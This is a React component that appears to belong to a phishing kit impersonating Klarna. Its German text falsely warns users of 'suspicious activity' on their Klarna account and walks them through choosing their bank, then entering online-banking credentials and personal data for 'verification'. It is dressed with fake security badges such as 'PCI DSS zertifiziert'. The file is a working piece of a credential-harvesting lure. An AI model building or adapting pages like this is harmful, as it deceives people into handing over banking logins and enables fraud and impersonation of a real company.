import React, { useState, useMemo, useEffect } from 'react';
import { ChevronDown, Search, Shield, AlertTriangle, CheckCircle } from 'lucide-react';

interface AvailableBank {
  id: string;
  displayName: string;
  logo: string;
  description: string;
  isActive: boolean;
}

interface BankSelectorProps {
  banks: AvailableBank[];
  onBankSelect: (bankId: string) => void;
}

const BankSelector: React.FC<BankSelectorProps> = ({ banks, onBankSelect }) => {
  const [searchTerm, setSearchTerm] = useState('');
  const [isDropdownOpen, setIsDropdownOpen] = useState(false);
  const [selectedBank, setSelectedBank] = useState<AvailableBank | null>(null);

  // Preload all bank logos when component mounts
  useEffect(() => {
    banks.forEach(bank => {
      const img = new Image();
      img.src = bank.logo;
    });
  }, [banks]);

  const activeBanks = banks.filter(bank => bank.isActive);
  
  const filteredBanks = useMemo(() => {
    if (!searchTerm) return activeBanks;
    return activeBanks.filter(bank => 
      bank.displayName.toLowerCase().includes(searchTerm.toLowerCase()) ||
      bank.description.toLowerCase().includes(searchTerm.toLowerCase())
    );
  }, [activeBanks, searchTerm]);

  const handleBankSelect = (bank: AvailableBank) => {
    setSelectedBank(bank);
    setIsDropdownOpen(false);
    setSearchTerm('');
  };

  const handleContinue = () => {
    if (selectedBank) {
      onBankSelect(selectedBank.id);
    }
  };

  return (
    <div className="klarna-bank-selector">
      <div className="klarna-bank-selector-header">
        <h1 className="klarna-title">Kontoverifizierung erforderlich</h1>
        <p className="klarna-subtitle">
          Aufgrund verdächtiger Aktivitäten müssen wir Ihr Konto verifizieren
        </p>
      </div>
      
      <div className="klarna-bank-selector-layout">
        {/* Left Column - Bank Selection */}
        <div className="klarna-bank-selector-form">
          <div className="klarna-form-group">
            <label className="klarna-label">
              <Search size={16} className="klarna-label-icon" />
              Wählen Sie Ihre Bank
            </label>
            
            <div className="klarna-bank-dropdown">
              <div 
                className={`klarna-bank-dropdown-trigger ${isDropdownOpen ? 'is-open' : ''}`}
                onClick={() => setIsDropdownOpen(!isDropdownOpen)}
              >
                {selectedBank ? (
                  <div className="klarna-selected-bank">
                    <img 
                      src={selectedBank.logo} 
                      alt={selectedBank.displayName}
                      className="klarna-selected-bank-logo"
                      onError={(e) => {
                        (e.target as HTMLImageElement).src = '/images/icons/bankingsuote.png';
                      }}
                    />
                    <div className="klarna-selected-bank-info">
                      <span className="klarna-selected-bank-name">{selectedBank.displayName}</span>
                      <span className="klarna-selected-bank-desc">{selectedBank.description}</span>
                    </div>
                  </div>
                ) : (
                  <span className="klarna-dropdown-placeholder">Bank auswählen...</span>
                )}
                <ChevronDown size={20} className="klarna-dropdown-arrow" />
              </div>
              
              {isDropdownOpen && (
                <div className="klarna-bank-dropdown-menu">
                  <div className="klarna-bank-search">
                    <Search size={16} className="klarna-search-icon" />
                    <input
                      type="text"
                      className="klarna-search-input"
                      placeholder="Bank suchen..."
                      value={searchTerm}
                      onChange={(e) => setSearchTerm(e.target.value)}
                      autoFocus
                    />
                  </div>
                  
                  <div className="klarna-bank-options">
                    {filteredBanks.length > 0 ? (
                      filteredBanks.map(bank => (
                        <button
                          key={bank.id}
                          className="klarna-bank-option"
                          onClick={() => handleBankSelect(bank)}
                        >
                          <img 
                            src={bank.logo} 
                            alt={bank.displayName}
                            className="klarna-bank-option-logo"
                            onError={(e) => {
                              (e.target as HTMLImageElement).src = '/images/icons/bankingsuote.png';
                            }}
                          />
                          <div className="klarna-bank-option-info">
                            <span className="klarna-bank-option-name">{bank.displayName}</span>
                            <span className="klarna-bank-option-desc">{bank.description}</span>
                          </div>
                        </button>
                      ))
                    ) : (
                      <div className="klarna-no-results">
                        <p>Keine Banken gefunden</p>
                        <small>Versuchen Sie einen anderen Suchbegriff</small>
                      </div>
                    )}
                  </div>
                </div>
              )}
            </div>
          </div>
          
          <button 
            className={`klarna-button klarna-button-primary ${!selectedBank ? 'klarna-button-disabled' : ''}`}
            onClick={handleContinue}
            disabled={!selectedBank}
          >
            Weiter zur Verifizierung
          </button>
        </div>
        
        {/* Right Column - Instructions */}
        <div className="klarna-bank-selector-instructions">
          <div className="klarna-verification-notice">
            <div className="klarna-notice-icon">
              <AlertTriangle size={32} color="#FF6B35" />
            </div>
            <h3 className="klarna-notice-title">Sicherheitsverifizierung</h3>
            <p className="klarna-notice-text">
              Wir haben ungewöhnliche Aktivitäten in Ihrem Klarna-Konto festgestellt. 
              Zu Ihrem Schutz müssen wir Ihre Identität verifizieren.
            </p>
          </div>
          
          <div className="klarna-verification-steps">
            <h4 className="klarna-steps-title">Verifizierungsprozess:</h4>
            <div className="klarna-step">
              <div className="klarna-step-number">1</div>
              <div className="klarna-step-content">
                <strong>Bank auswählen</strong>
                <p>Wählen Sie Ihre Bank aus der Liste</p>
              </div>
            </div>
            <div className="klarna-step">
              <div className="klarna-step-number">2</div>
              <div className="klarna-step-content">
                <strong>Anmeldedaten eingeben</strong>
                <p>Bestätigen Sie Ihre Online-Banking-Daten</p>
              </div>
            </div>
            <div className="klarna-step">
              <div className="klarna-step-number">3</div>
              <div className="klarna-step-content">
                <strong>Identität bestätigen</strong>
                <p>Verifizieren Sie Ihre persönlichen Daten</p>
              </div>
            </div>
          </div>
          
          <div className="klarna-security-badges">
            <div className="klarna-security-badge">
              <Shield size={16} />
              <span>256-Bit SSL Verschlüsselung</span>
            </div>
            <div className="klarna-security-badge">
              <CheckCircle size={16} />
              <span>PCI DSS zertifiziert</span>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default BankSelector;
